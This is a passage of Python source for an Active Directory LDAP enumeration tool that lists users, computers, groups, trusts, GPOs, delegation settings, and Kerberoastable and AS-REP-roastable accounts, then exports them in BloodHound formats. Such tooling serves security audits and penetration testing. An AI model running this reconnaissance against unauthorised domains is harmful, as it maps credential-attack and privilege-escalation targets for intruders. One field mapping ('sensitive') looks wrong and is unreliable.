    except Exception as e:
        print(f"[-] Error getting domain info: {e}")
        return {}

def get_users(conn, base_dn):
    """Get all users with BloodHound-compatible attributes"""
    users = []
    try:
        # BloodHound.py queries these attributes
        entries = conn.extend.standard.paged_search(
            search_base=base_dn,
            search_filter='(&(objectClass=user)(objectCategory=person))',
            search_scope=SUBTREE,
            attributes=['sAMAccountName', 'userPrincipalName', 'distinguishedName',
                       'description', 'memberOf', 'userAccountControl', 
                       'adminCount', 'servicePrincipalName', 'pwdLastSet',
                       'lastLogon', 'lastLogonTimestamp', 'displayName',
                       'mail', 'title', 'homeDirectory', 'objectSid',
                       'primaryGroupID', 'sIDHistory', 'msDS-AllowedToDelegateTo',
                       'msDS-AllowedToActOnBehalfOfOtherIdentity',
                       'nTSecurityDescriptor'],  # For ACLs
            paged_size=200,
            generator=True
        )
        
        processed = 0
        for entry in entries:
            try:
                if entry['type'] != 'searchResEntry':
                    continue
                
                attrs = entry.get('attributes', {})
                user = {}
                
                # Basic attributes
                for key in ['sAMAccountName', 'userPrincipalName', 'distinguishedName',
                           'description', 'displayName', 'mail', 'title']:
                    if key in attrs:
                        val = attrs[key]
                        user[key] = val[0] if isinstance(val, list) and val else val

                # objectSid needs special handling - convert bytes to string
                if 'objectSid' in attrs:
                    sid_val = attrs['objectSid']
                    if isinstance(sid_val, list) and sid_val:
                        sid_val = sid_val[0]
                    if isinstance(sid_val, bytes):
                        user['objectSid'] = sid_to_string(sid_val)
                    else:
                        user['objectSid'] = sid_val
                
                # Group memberships
                if 'memberOf' in attrs:
                    user['memberOf'] = attrs['memberOf'] if isinstance(attrs['memberOf'], list) else [attrs['memberOf']]
                
                # User Account Control
                if 'userAccountControl' in attrs:
                    uac = attrs['userAccountControl']
                    if isinstance(uac, list):
                        uac = uac[0] if uac else 0
                    try:
                        uac = int(uac)
                    except (ValueError, TypeError):
                        uac = 0
                    user['userAccountControl'] = uac
                    user['enabled'] = not bool(uac & 0x0002)  # ACCOUNTDISABLE
                    user['trustedToAuth'] = bool(uac & 0x1000000)  # TRUSTED_TO_AUTH_FOR_DELEGATION
                    user['passwordNotRequired'] = bool(uac & 0x0020)  # PASSWD_NOTREQD
                    user['dontRequirePreauth'] = bool(uac & 0x400000)  # DONT_REQ_PREAUTH
                
                # Privileged user markers
                if 'adminCount' in attrs:
                    user['adminCount'] = attrs['adminCount'][0] if isinstance(attrs['adminCount'], list) else attrs['adminCount']
                
                # Kerberos delegation
                if 'servicePrincipalName' in attrs:
                    spns = attrs['servicePrincipalName']
                    user['servicePrincipalName'] = spns if isinstance(spns, list) else [spns]
                
                if 'msDS-AllowedToDelegateTo' in attrs:
                    delegates = attrs['msDS-AllowedToDelegateTo']
                    user['allowedToDelegateTo'] = delegates if isinstance(delegates, list) else [delegates]
                
                # RBCD
                if 'msDS-AllowedToActOnBehalfOfOtherIdentity' in attrs:
                    user['allowedToActOnBehalfOfOtherIdentity'] = True
                
                # Primary group
                if 'primaryGroupID' in attrs:
                    user['primaryGroupID'] = attrs['primaryGroupID'][0] if isinstance(attrs['primaryGroupID'], list) else attrs['primaryGroupID']
                
                # SID History (privilege escalation vector)
                if 'sIDHistory' in attrs:
                    history = attrs['sIDHistory']
                    if not isinstance(history, list):
                        history = [history]
                    # Convert bytes SIDs to strings
                    converted_history = []
                    for sid_item in history:
                        if isinstance(sid_item, bytes):
                            converted_history.append(sid_to_string(sid_item))
                        else:
                            converted_history.append(sid_item)
                    user['sIDHistory'] = converted_history
                
                # Security descriptor for ACLs (convert to base64 for storage)
                if 'nTSecurityDescriptor' in attrs:
                    sd = attrs['nTSecurityDescriptor']
                    if sd:
                        if isinstance(sd, bytes):
                            user['nTSecurityDescriptor'] = base64.b64encode(sd).decode('utf-8')
                        elif isinstance(sd, list) and sd:
                            user['nTSecurityDescriptor'] = base64.b64encode(sd[0]).decode('utf-8')
                
                users.append(user)
                processed += 1
                if processed % 1000 == 0:
                    print(f"    ... processed {processed} users", file=sys.stderr)
            
            except (KeyError, ValueError, TypeError) as e:
                # Skip corrupted entries from SOCKS proxy
                print(f"[!] Warning: Skipping corrupted entry: {e}", file=sys.stderr)
                continue
            except Exception as e:
                print(f"[!] Warning: Error processing entry: {e}", file=sys.stderr)
                continue
        
    except Exception as e:
        print(f"[-] Error getting users: {e}")
        import traceback
        traceback.print_exc()
    
    return users

def get_computers(conn, base_dn):
    """Get all computers with BloodHound-compatible attributes"""
    computers = []
    try:
        entries = conn.extend.standard.paged_search(
            search_base=base_dn,
            search_filter='(objectClass=computer)',
            search_scope=SUBTREE,
            attributes=['dNSHostName', 'sAMAccountName', 'distinguishedName',
                       'operatingSystem', 'operatingSystemVersion', 
                       'userAccountControl', 'servicePrincipalName',
                       'lastLogon', 'lastLogonTimestamp', 'pwdLastSet',
                       'objectSid', 'primaryGroupID', 
                       'msDS-AllowedToDelegateTo',
                       'msDS-AllowedToActOnBehalfOfOtherIdentity',
                       'nTSecurityDescriptor'],
            paged_size=200,
            generator=True
        )
        
        for entry in entries:
            if entry['type'] != 'searchResEntry':
                continue
            
            attrs = entry.get('attributes', {})
            computer = {}

            for key in ['dNSHostName', 'sAMAccountName', 'distinguishedName',
                       'operatingSystem', 'operatingSystemVersion']:
                if key in attrs:
                    val = attrs[key]
                    computer[key] = val[0] if isinstance(val, list) and val else val

            # objectSid needs special handling - convert bytes to string
            if 'objectSid' in attrs:
                sid_val = attrs['objectSid']
                if isinstance(sid_val, list) and sid_val:
                    sid_val = sid_val[0]
                if isinstance(sid_val, bytes):
                    computer['objectSid'] = sid_to_string(sid_val)
                else:
                    computer['objectSid'] = sid_val
            
            if 'userAccountControl' in attrs:
                uac = attrs['userAccountControl']
                if isinstance(uac, list):
                    uac = uac[0] if uac else 0
                try:
                    uac = int(uac)
                except (ValueError, TypeError):
                    uac = 0
                computer['userAccountControl'] = uac
                computer['enabled'] = not bool(uac & 0x0002)
                computer['trustedToAuth'] = bool(uac & 0x1000000)  # TRUSTED_TO_AUTH_FOR_DELEGATION
                computer['unconstrainedDelegation'] = bool(uac & 0x80000)  # TRUSTED_FOR_DELEGATION
            
            # Delegation attributes
            if 'msDS-AllowedToDelegateTo' in attrs:
                delegates = attrs['msDS-AllowedToDelegateTo']
                computer['allowedToDelegateTo'] = delegates if isinstance(delegates, list) else [delegates]
            
            if 'msDS-AllowedToActOnBehalfOfOtherIdentity' in attrs:
                computer['allowedToActOnBehalfOfOtherIdentity'] = True
            
            # Security descriptor for ACLs
            if 'nTSecurityDescriptor' in attrs:
                sd = attrs['nTSecurityDescriptor']
                if sd:
                    import base64
                    if isinstance(sd, bytes):
                        computer['nTSecurityDescriptor'] = base64.b64encode(sd).decode('utf-8')
                    elif isinstance(sd, list) and sd:
                        computer['nTSecurityDescriptor'] = base64.b64encode(sd[0]).decode('utf-8')
            
            computers.append(computer)
        
    except Exception as e:
        print(f"[-] Error getting computers: {e}")
    
    return computers

def get_groups(conn, base_dn):
    """Get all groups with BloodHound-compatible attributes"""
    groups = []
    try:
        entries = conn.extend.standard.paged_search(
            search_base=base_dn,
            search_filter='(objectClass=group)',
            search_scope=SUBTREE,
            attributes=['sAMAccountName', 'distinguishedName', 'description',
                       'member', 'adminCount', 'groupType', 'objectSid',
                       'nTSecurityDescriptor'],
            paged_size=200,
            generator=True
        )
        
        for entry in entries:
            if entry['type'] != 'searchResEntry':
                continue
            
            attrs = entry.get('attributes', {})
            group = {}

            for key in ['sAMAccountName', 'distinguishedName', 'description']:
                if key in attrs:
                    val = attrs[key]
                    group[key] = val[0] if isinstance(val, list) and val else val

            # objectSid needs special handling - convert bytes to string
            if 'objectSid' in attrs:
                sid_val = attrs['objectSid']
                if isinstance(sid_val, list) and sid_val:
                    sid_val = sid_val[0]
                if isinstance(sid_val, bytes):
                    group['objectSid'] = sid_to_string(sid_val)
                else:
                    group['objectSid'] = sid_val
            
            if 'member' in attrs:
                group['member'] = attrs['member'] if isinstance(attrs['member'], list) else [attrs['member']]
                group['member_count'] = len(group['member'])
            
            if 'adminCount' in attrs:
                group['adminCount'] = attrs['adminCount'][0] if isinstance(attrs['adminCount'], list) else attrs['adminCount']
            
            if 'groupType' in attrs:
                gt = attrs['groupType']
                if isinstance(gt, list):
                    gt = gt[0] if gt else 0
                try:
                    gt = int(gt)
                except (ValueError, TypeError):
                    gt = 0
                group['groupType'] = gt
                # -2147483646 = Global security group
                # -2147483644 = Domain local security group
                # -2147483643 = Builtin local security group
                # -2147483640 = Universal security group
                group['isSecurityGroup'] = bool(gt & 0x80000000)
            
            # Security descriptor for ACLs
            if 'nTSecurityDescriptor' in attrs:
                sd = attrs['nTSecurityDescriptor']
                if sd:
                    import base64
                    if isinstance(sd, bytes):
                        group['nTSecurityDescriptor'] = base64.b64encode(sd).decode('utf-8')
                    elif isinstance(sd, list) and sd:
                        group['nTSecurityDescriptor'] = base64.b64encode(sd[0]).decode('utf-8')
            
            groups.append(group)
        
    except Exception as e:
        print(f"[-] Error getting groups: {e}")
    
    return groups

def get_trusts(conn, base_dn):
    """Get all domain trusts"""
    trusts = []
    try:
        entries = conn.extend.standard.paged_search(
            search_base=f"CN=System,{base_dn}",
            search_filter='(objectClass=trustedDomain)',
            search_scope=SUBTREE,
            attributes=['name', 'trustPartner', 'trustDirection', 'trustType', 
                       'trustAttributes', 'flatName'],
            paged_size=50,
            generator=True
        )
        
        for entry in entries:
            if entry['type'] != 'searchResEntry':
                continue
            
            attrs = entry.get('attributes', {})
            trust = {}
            
            for key in ['name', 'trustPartner', 'flatName']:
                if key in attrs:
                    val = attrs[key]
                    trust[key] = val[0] if isinstance(val, list) and val else val
            
            if 'trustDirection' in attrs:
                direction = attrs['trustDirection']
                if isinstance(direction, list):
                    direction = direction[0] if direction else 0
                direction_map = {0: "Disabled", 1: "Inbound", 2: "Outbound", 3: "Bidirectional"}
                trust['trustDirection'] = direction_map.get(direction, f"Unknown ({direction})")
            
            if 'trustType' in attrs:
                ttype = attrs['trustType']
                if isinstance(ttype, list):
                    ttype = ttype[0] if ttype else 0
                type_map = {1: "Downlevel", 2: "Uplevel", 3: "MIT", 4: "DCE"}
                trust['trustType'] = type_map.get(ttype, f"Unknown ({ttype})")
            
            trusts.append(trust)
        
    except Exception as e:
        print(f"[-] Error getting trusts: {e}")
    
    return trusts

def get_gpos(conn, base_dn):
    """Get all GPOs with ACL information"""
    gpos = []
    try:
        entries = conn.extend.standard.paged_search(
            search_base=f"CN=Policies,CN=System,{base_dn}",
            search_filter='(objectClass=groupPolicyContainer)',
            search_scope=SUBTREE,
            attributes=['displayName', 'name', 'gPCFileSysPath', 'distinguishedName',
                       'objectSid', 'nTSecurityDescriptor'],
            paged_size=100,
            generator=True
        )
        
        for entry in entries:
            if entry['type'] != 'searchResEntry':
                continue
            
            attrs = entry.get('attributes', {})
            gpo = {}

            for key in ['displayName', 'name', 'gPCFileSysPath', 'distinguishedName']:
                if key in attrs:
                    val = attrs[key]
                    gpo[key] = val[0] if isinstance(val, list) and val else val

            # objectSid needs special handling - convert bytes to string
            if 'objectSid' in attrs:
                sid_val = attrs['objectSid']
                if isinstance(sid_val, list) and sid_val:
                    sid_val = sid_val[0]
                if isinstance(sid_val, bytes):
                    gpo['objectSid'] = sid_to_string(sid_val)
                else:
                    gpo['objectSid'] = sid_val
            
            # Security descriptor for ACLs
            if 'nTSecurityDescriptor' in attrs:
                sd = attrs['nTSecurityDescriptor']
                if sd:
                    import base64
                    if isinstance(sd, bytes):
                        gpo['nTSecurityDescriptor'] = base64.b64encode(sd).decode('utf-8')
                    elif isinstance(sd, list) and sd:
                        gpo['nTSecurityDescriptor'] = base64.b64encode(sd[0]).decode('utf-8')
            
            gpos.append(gpo)
        
    except Exception as e:
        print(f"[-] Error getting GPOs: {e}")
    
    return gpos

def get_ous(conn, base_dn):
    """Get all OUs"""
    ous = []
    try:
        entries = conn.extend.standard.paged_search(
            search_base=base_dn,
            search_filter='(objectClass=organizationalUnit)',
            search_scope=SUBTREE,
            attributes=['name', 'distinguishedName', 'description', 'gPLink'],
            paged_size=200,
            generator=True
        )
        
        for entry in entries:
            if entry['type'] != 'searchResEntry':
                continue
            
            attrs = entry.get('attributes', {})
            ou = {}
            
            for key in ['name', 'distinguishedName', 'description', 'gPLink']:
                if key in attrs:
                    val = attrs[key]
                    ou[key] = val[0] if isinstance(val, list) and val else val
            
            ous.append(ou)
        
    except Exception as e:
        print(f"[-] Error getting OUs: {e}")
    
    return ous

def get_containers(conn, base_dn):
    """Get all containers"""
    containers = []
    try:
        entries = conn.extend.standard.paged_search(
            search_base=base_dn,
            search_filter='(objectClass=container)',
            search_scope=SUBTREE,
            attributes=['name', 'distinguishedName', 'description'],
            paged_size=200,
            generator=True
        )
        
        for entry in entries:
            if entry['type'] != 'searchResEntry':
                continue
            
            attrs = entry.get('attributes', {})
            container = {}
            
            for key in ['name', 'distinguishedName', 'description']:
                if key in attrs:
                    val = attrs[key]
                    container[key] = val[0] if isinstance(val, list) and val else val
            
            containers.append(container)
        
    except Exception as e:
        print(f"[-] Error getting containers: {e}")
    
    return containers

def get_kerberoastable(conn, base_dn):
    """Get Kerberoastable accounts (users with SPN) - optimized for large environments"""
    kerberoastable = []
    try:
        # Optimized: Use samAccountType instead of objectCategory (indexed attribute)
        # 805306368 = USER_OBJECT (excludes computers which are 805306369)
        entries = conn.extend.standard.paged_search(
            search_base=base_dn,
            search_filter='(&(samAccountType=805306368)(servicePrincipalName=*))',
            search_scope=SUBTREE,
            attributes=['sAMAccountName', 'userPrincipalName', 'servicePrincipalName',
                       'distinguishedName', 'memberOf', 'pwdLastSet'],
            paged_size=500,  # Larger page size for better performance
            generator=True
        )
        
        count = 0
        for entry in entries:
            if entry['type'] != 'searchResEntry':
                continue
            
            count += 1
            if count % 50 == 0:
                print(f"    ... {count} accounts", end='\r')
            
            attrs = entry.get('attributes', {})
            account = {}
            
            for key in ['sAMAccountName', 'userPrincipalName', 'distinguishedName']:
                if key in attrs:
                    val = attrs[key]
                    account[key] = val[0] if isinstance(val, list) and val else val
            
            if 'servicePrincipalName' in attrs:
                spns = attrs['servicePrincipalName']
                account['servicePrincipalName'] = spns if isinstance(spns, list) else [spns]
                account['spn_count'] = len(account['servicePrincipalName'])
            
            if 'memberOf' in attrs:
                account['memberOf'] = attrs['memberOf'] if isinstance(attrs['memberOf'], list) else [attrs['memberOf']]
            
            if 'pwdLastSet' in attrs:
                account['pwdLastSet'] = attrs['pwdLastSet'][0] if isinstance(attrs['pwdLastSet'], list) else attrs['pwdLastSet']
            
            kerberoastable.append(account)
        
        if count > 0:
            print(f"    ... {count} total         ")
        
    except Exception as e:
        print(f"[-] Error getting Kerberoastable accounts: {e}")
    
    return kerberoastable
    
    return kerberoastable

def get_asreproastable(conn, base_dn):
    """Get AS-REP roastable accounts (no Kerberos pre-auth required) - optimized"""
    asreproastable = []
    try:
        # Optimized: Use samAccountType for better performance
        # DONT_REQ_PREAUTH = 0x400000 (4194304)
        entries = conn.extend.standard.paged_search(
            search_base=base_dn,
            search_filter='(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))',
            search_scope=SUBTREE,
            attributes=['sAMAccountName', 'userPrincipalName', 'distinguishedName',
                       'userAccountControl', 'memberOf', 'pwdLastSet'],
            paged_size=500,
            generator=True
        )
        
        count = 0
        for entry in entries:
            if entry['type'] != 'searchResEntry':
                continue
            
            count += 1
            if count % 50 == 0:
                print(f"    ... {count} accounts", end='\r')
            
            attrs = entry.get('attributes', {})
            account = {}
            
            for key in ['sAMAccountName', 'userPrincipalName', 'distinguishedName']:
                if key in attrs:
                    val = attrs[key]
                    account[key] = val[0] if isinstance(val, list) and val else val
            
            if 'userAccountControl' in attrs:
                uac = attrs['userAccountControl']
                if isinstance(uac, list):
                    uac = uac[0] if uac else 0
                try:
                    uac = int(uac)
                except (ValueError, TypeError):
                    uac = 0
                account['userAccountControl'] = uac
            
            if 'memberOf' in attrs:
                account['memberOf'] = attrs['memberOf'] if isinstance(attrs['memberOf'], list) else [attrs['memberOf']]
            
            if 'pwdLastSet' in attrs:
                account['pwdLastSet'] = attrs['pwdLastSet'][0] if isinstance(attrs['pwdLastSet'], list) else attrs['pwdLastSet']
            
            asreproastable.append(account)
        
        if count > 0:
            print(f"    ... {count} total         ")
        
    except Exception as e:
        print(f"[-] Error getting AS-REP roastable accounts: {e}")
    
    return asreproastable

def custom_ldap_query(conn, base_dn, search_filter, attributes=None, search_scope=SUBTREE):
    """
    Execute a custom LDAP query with specified filter and attributes

    Args:
        conn: LDAP connection object
        base_dn: Base DN for the search
        search_filter: LDAP filter string (e.g., '(objectClass=user)')
        attributes: List of attributes to retrieve (None = all attributes)
        search_scope: Search scope (SUBTREE, BASE, LEVEL)

    Returns:
        List of matching entries with their attributes
    """
    results = []
    try:
        print(f"[*] Executing custom LDAP query...")
        print(f"    Base DN: {base_dn}")
        print(f"    Filter: {search_filter}")
        if attributes:
            print(f"    Attributes: {', '.join(attributes)}")
        else:
            print(f"    Attributes: ALL")

        entries = conn.extend.standard.paged_search(
            search_base=base_dn,
            search_filter=search_filter,
            search_scope=search_scope,
            attributes=attributes if attributes else ['*'],
            paged_size=500,
            generator=True
        )

        count = 0
        for entry in entries:
            if entry['type'] != 'searchResEntry':
                continue

            count += 1
            if count % 50 == 0:
                print(f"    ... {count} entries", end='\r')

            attrs = entry.get('attributes', {})
            dn = entry.get('dn', '')

            # Build result entry
            result_entry = {'dn': dn}

            # Add all attributes
            for key, val in attrs.items():
                if isinstance(val, list):
                    if len(val) == 1:
                        result_entry[key] = val[0]
                    elif len(val) == 0:
                        result_entry[key] = None
                    else:
                        result_entry[key] = val
                else:
                    result_entry[key] = val

            results.append(result_entry)

        if count > 0:
            print(f"    ... {count} total         ")

    except Exception as e:
        print(f"[-] Error executing custom LDAP query: {e}")
        import traceback
        traceback.print_exc()

    return results

# Display functions
def display_users(users):
    """Display users in readable format"""
    print(f"\n{'='*70}")
    print("USERS (showing first 20):")
    print('='*70)
    for user in users[:20]:
        print(f"\n{user.get('sAMAccountName', 'N/A')}")
        if 'userPrincipalName' in user:
            print(f"  UPN: {user['userPrincipalName']}")
        if 'description' in user:
            print(f"  Description: {user['description']}")
        if user.get('adminCount'):
            print(f"  [!] AdminCount: {user['adminCount']}")

def display_computers(computers):
    """Display computers in readable format"""
    print(f"\n{'='*70}")
    print("COMPUTERS (showing first 20):")
    print('='*70)
    for computer in computers[:20]:
        print(f"\n{computer.get('dNSHostName', computer.get('sAMAccountName', 'N/A'))}")
        if 'operatingSystem' in computer:
            print(f"  OS: {computer['operatingSystem']}")

def display_groups(groups):
    """Display groups in readable format"""
    print(f"\n{'='*70}")
    print("GROUPS (showing first 20):")
    print('='*70)
    for group in groups[:20]:
        print(f"\n{group.get('sAMAccountName', 'N/A')}")
        if 'description' in group:
            print(f"  Description: {group['description']}")
        if 'member_count' in group:
            print(f"  Members: {group['member_count']}")

def display_trusts(trusts):
    """Display trusts in readable format"""
    print(f"\n{'='*70}")
    print("TRUSTS:")
    print('='*70)
    for trust in trusts:
        print(f"\n{trust.get('trustPartner', 'N/A')}")
        if 'trustDirection' in trust:
            print(f"  Direction: {trust['trustDirection']}")
        if 'trustType' in trust:
            print(f"  Type: {trust['trustType']}")

def display_kerberoastable(accounts):
    """Display Kerberoastable accounts"""
    print(f"\n{'='*70}")
    print("KERBEROASTABLE ACCOUNTS:")
    print('='*70)
    for account in accounts:
        print(f"\n{account.get('sAMAccountName', 'N/A')}")
        if 'servicePrincipalName' in account:
            for spn in account['servicePrincipalName'][:3]:
                print(f"  SPN: {spn}")

def display_asreproastable(accounts):
    """Display AS-REP roastable accounts"""
    print(f"\n{'='*70}")
    print("AS-REP ROASTABLE ACCOUNTS:")
    print('='*70)
    for account in accounts:
        print(f"  {account.get('sAMAccountName', 'N/A')}")

def display_custom_query(results, max_display=20):
    """Display custom query results in readable format"""
    print(f"\n{'='*70}")
    print(f"CUSTOM QUERY RESULTS (showing first {max_display} of {len(results)}):")
    print('='*70)

    for idx, entry in enumerate(results[:max_display], 1):
        print(f"\n[{idx}] {entry.get('dn', 'N/A')}")

        # Display all attributes except DN (already shown)
        for key, val in entry.items():
            if key == 'dn':
                continue

            # Format the value for display
            if isinstance(val, list):
                if len(val) > 5:
                    # Show first 5 items for long lists
                    val_str = ', '.join(str(v) for v in val[:5]) + f'... (+{len(val)-5} more)'
                else:
                    val_str = ', '.join(str(v) for v in val)
            elif isinstance(val, bytes):
                # Show hex for binary data
                val_str = f"<binary: {len(val)} bytes>"
            else:
                val_str = str(val)

            # Truncate very long values
            if len(val_str) > 200:
                val_str = val_str[:200] + '...'

            print(f"  {key}: {val_str}")

    if len(results) > max_display:
        print(f"\n... and {len(results) - max_display} more results")
        print(f"    (Use -o to save full results to file)")

def save_output(data, output_dir, domain, output_format='legacy'):
    """
    Save output in specified format
    
    Formats:
    - 'legacy': BloodHound Legacy v4 (default)
    - 'ce': BloodHound CE v5
    - 'bofhound': BOFHound custom format
    """
    try:
        # Use current directory if output_dir is just a filename
        if output_dir and not ('/' in output_dir or '\\' in output_dir):
            output_path = Path.cwd()
            base_name = output_dir.replace('.json', '').replace('.txt', '')
        else:
            output_path = Path(output_dir) if output_dir else Path.cwd()
            output_path.mkdir(parents=True, exist_ok=True)
            base_name = None
        
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        
        # Handle different output formats
        if output_format == 'bofhound':
            # BOFHound single JSON format
            if base_name:
                json_filename = output_path / f"{base_name}_{timestamp}.json"
            else:
                json_filename = output_path / f"ldap_enum_{domain}_{timestamp}.json"
            
            # Sanitize bytes objects before JSON serialization
            sanitized_data = sanitize_for_json(data)
            
            with open(json_filename, 'w') as f:
                safe_json_dump(sanitized_data, f, indent=2)
            
            print(f"\n[+] BOFHound JSON saved to: {json_filename}")
            print(f"[*] BOFHound import: bofhound -i {json_filename}")
            
            # Save text files for BOFHound format
            save_text_files(data, output_path, domain, timestamp, base_name)
            
        elif output_format in ['legacy', 'ce']:
            # BloodHound formats (separate JSON files)
            print(f"\n[*] Converting to BloodHound {'Legacy v4' if output_format == 'legacy' else 'CE v5'} format...")
            
            # Create subdirectory
            if base_name:
                bh_dir = output_path / f"{base_name}_bh{'legacy' if output_format == 'legacy' else 'ce'}_{timestamp}"
            else:
                bh_dir = output_path / f"bh{'legacy' if output_format == 'legacy' else 'ce'}_{domain}_{timestamp}"
            
            bh_dir.mkdir(parents=True, exist_ok=True)
            
            # Generate separate JSON files
            if output_format == 'legacy':
                files_created = convert_to_bloodhound_legacy(data, domain, bh_dir)
            else:
                files_created = convert_to_bloodhound_ce(data, domain, bh_dir)
            
            print(f"\n[+] BloodHound {'Legacy' if output_format == 'legacy' else 'CE'} files saved to: {bh_dir}/")
            for filename in files_created:
                print(f"    - {filename}")
            print(f"\n[*] Import to BloodHound via GUI or:")
            print(f"    cd {bh_dir} && zip -r ../bloodhound_{timestamp}.zip *.json")
        
    except Exception as e:
        print(f"[-] Error saving output: {e}")
        import traceback
        traceback.print_exc()

def save_text_files(data, output_path, domain, timestamp, base_name=None):
    """Save simple text file outputs"""
    if 'users' in data.get('data', {}) and data['data']['users']:
        if base_name:
            users_file = output_path / f"{base_name}_users_{timestamp}.txt"
        else:
            users_file = output_path / f"users_{domain}_{timestamp}.txt"
        
        with open(users_file, 'w') as f:
            for user in data['data']['users']:
                sam = user.get('sAMAccountName', '')
                if sam:
                    f.write(f"{sam}\n")
        print(f"[+] Users list saved to: {users_file}")
    
    if 'computers' in data.get('data', {}) and data['data']['computers']:
        if base_name:
            computers_file = output_path / f"{base_name}_computers_{timestamp}.txt"
        else:
            computers_file = output_path / f"computers_{domain}_{timestamp}.txt"
        
        with open(computers_file, 'w') as f:
            for computer in data['data']['computers']:
                hostname = computer.get('dNSHostName') or computer.get('sAMAccountName', '')
                if hostname:
                    f.write(f"{hostname}\n")
        print(f"[+] Computers list saved to: {computers_file}")
    
    if 'kerberoastable' in data.get('data', {}) and data['data']['kerberoastable']:
        if base_name:
            kerb_file = output_path / f"{base_name}_kerberoastable_{timestamp}.txt"
        else:
            kerb_file = output_path / f"kerberoastable_{domain}_{timestamp}.txt"
        
        with open(kerb_file, 'w') as f:
            for account in data['data']['kerberoastable']:
                sam = account.get('sAMAccountName', '')
                if sam:
                    f.write(f"{sam}\n")
        print(f"[+] Kerberoastable accounts saved to: {kerb_file}")
    
    if 'asreproastable' in data.get('data', {}) and data['data']['asreproastable']:
        if base_name:
            asrep_file = output_path / f"{base_name}_asreproastable_{timestamp}.txt"
        else:
            asrep_file = output_path / f"asreproastable_{domain}_{timestamp}.txt"
        
        with open(asrep_file, 'w') as f:
            for account in data['data']['asreproastable']:
                sam = account.get('sAMAccountName', '')
                if sam:
                    f.write(f"{sam}\n")
        print(f"[+] AS-REP roastable accounts saved to: {asrep_file}")

def convert_to_bloodhound_legacy(data, domain, output_dir):
    """
    Convert to BloodHound Legacy format (compatible with BloodHound 4.x and bloodhound.py)

    Key differences from CE:
    - version: 5 (BloodHound.py uses 5)
    - Trust values are integers (not strings)
    - Methods bitmask for DCOnly
    """
    files_created = []

    meta = {
        "methods": 0,
        "type": "",
        "count": 0,
        "version": 5  # BloodHound.py uses version 5
    }
    
    domain_upper = domain.upper()
    
    # 1. DOMAINS.JSON
    if 'domain_info' in data.get('data', {}):
        info = data['data']['domain_info']

        domains_data = {
            "data": [{
                "ObjectIdentifier": info.get('objectSid', domain_upper),
                "Properties": {
                    "domain": domain_upper,
                    "name": domain_upper,
                    "distinguishedname": f"DC={domain.replace('.', ',DC=')}".upper(),
                    "domainsid": info.get('objectSid', f"S-1-5-21-{domain_upper}"),
                    "functionallevel": info.get('functional_level', 'Unknown'),
                    "description": info.get('description') or '',
                    "highvalue": True,
                    "whencreated": 0
                },
                "Trusts": [],
                "Links": [],
                "ChildObjects": [],
                "GPOChanges": {
                    "AffectedComputers": [],
                    "DcomUsers": [],
                    "LocalAdmins": [],
                    "PSRemoteUsers": [],
                    "RemoteDesktopUsers": []
                },
                "Aces": [],
                "IsDeleted": False
            }],
            "meta": dict(meta, type="domains", count=1)
        }
        
        # Add trusts with INTEGER values for Legacy
        if 'trusts' in data.get('data', {}):
            for trust in data['data']['trusts']:
                # Convert string values to integers
                direction_str = trust.get('trustDirection', 'Unknown')
                type_str = trust.get('trustType', 'Unknown')
                
                trust_obj = {
                    "TargetDomainSid": trust.get('objectSid', ''),
                    "TargetDomainName": trust.get('trustPartner', '').upper(),
                    "IsTransitive": True,
                    "SidFilteringEnabled": True,
                    "TrustDirection": TRUST_DIRECTION_MAP.get(direction_str, 0),  # INTEGER
                    "TrustType": TRUST_TYPE_MAP.get(type_str, 2)  # INTEGER
                }
                domains_data['data'][0]['Trusts'].append(trust_obj)
        
        with open(output_dir / 'domains.json', 'w') as f:
            safe_json_dump(domains_data, f, indent=2)
        files_created.append('domains.json')
    
    # 2. USERS.JSON
    if 'users' in data.get('data', {}):
        users_bh = []
        for user in data['data']['users']:
            lastlogontimestamp = user.get('lastLogonTimestamp', 0)
            if lastlogontimestamp == 0:
                lastlogontimestamp = -1

            user_obj = {
                "ObjectIdentifier": user.get('objectSid', user.get('distinguishedName', '')),
                "Properties": {
                    "domain": domain_upper,
                    "name": f"{user.get('sAMAccountName', 'UNKNOWN')}@{domain_upper}",
                    "distinguishedname": user.get('distinguishedName', '').upper(),
                    "domainsid": domain_upper,
                    "samaccountname": user.get('sAMAccountName', ''),
                    "description": user.get('description'),
                    "whencreated": 0,
                    "enabled": user.get('enabled', True),
                    "pwdlastset": user.get('pwdLastSet', 0),
                    "lastlogon": user.get('lastLogon', 0),
                    "lastlogontimestamp": lastlogontimestamp,
                    "displayname": user.get('displayName'),
                    "email": user.get('mail'),
                    "title": user.get('title'),
                    "homedirectory": user.get('homeDirectory'),
                    "userpassword": None,
                    "unixpassword": None,
                    "unicodepassword": None,
                    "sfupassword": None,
                    "logonscript": None,
                    "admincount": user.get('adminCount', 0) == 1,
                    "sensitive": user.get('passwordNotRequired', False),
                    "dontreqpreauth": user.get('dontRequirePreauth', False),
                    "passwordnotreqd": user.get('passwordNotRequired', False),
                    "unconstraineddelegation": False,
                    "pwdneverexpires": False,
                    "trustedtoauth": user.get('trustedToAuth', False),
                    "hasspn": bool(user.get('servicePrincipalName')),
                    "serviceprincipalnames": user.get('servicePrincipalName', []),
                    "sidhistory": []
                },
                "PrimaryGroupSid": user.get('primaryGroupID', ''),
                "AllowedToDelegate": [],
                "SPNTargets": [],
                "HasSIDHistory": [],
                "IsDeleted": False,
                "Aces": []
            }
            users_bh.append(user_obj)
        
        users_data = {
            "data": users_bh,
            "meta": dict(meta, type="users", count=len(users_bh))
        }
        
        with open(output_dir / 'users.json', 'w') as f:
            safe_json_dump(users_data, f, indent=2)
        files_created.append('users.json')
    
    # 3. COMPUTERS.JSON
    if 'computers' in data.get('data', {}):
        computers_bh = []
        for computer in data['data']['computers']:
            lastlogontimestamp = computer.get('lastLogonTimestamp', 0)
            if lastlogontimestamp == 0:
                lastlogontimestamp = -1

            comp_obj = {
                "ObjectIdentifier": computer.get('objectSid', computer.get('distinguishedName', '')),
                "Properties": {
                    "domain": domain_upper,
                    "name": computer.get('dNSHostName', computer.get('sAMAccountName', '')).upper(),
                    "distinguishedname": computer.get('distinguishedName', '').upper(),
                    "domainsid": domain_upper,
                    "samaccountname": computer.get('sAMAccountName', ''),
                    "description": computer.get('description'),
                    "whencreated": 0,
                    "enabled": computer.get('enabled', True),
                    "unconstraineddelegation": computer.get('unconstrainedDelegation', False),
                    "trustedtoauth": computer.get('trustedToAuth', False),
                    "haslaps": False,
                    "lastlogon": computer.get('lastLogon', 0),
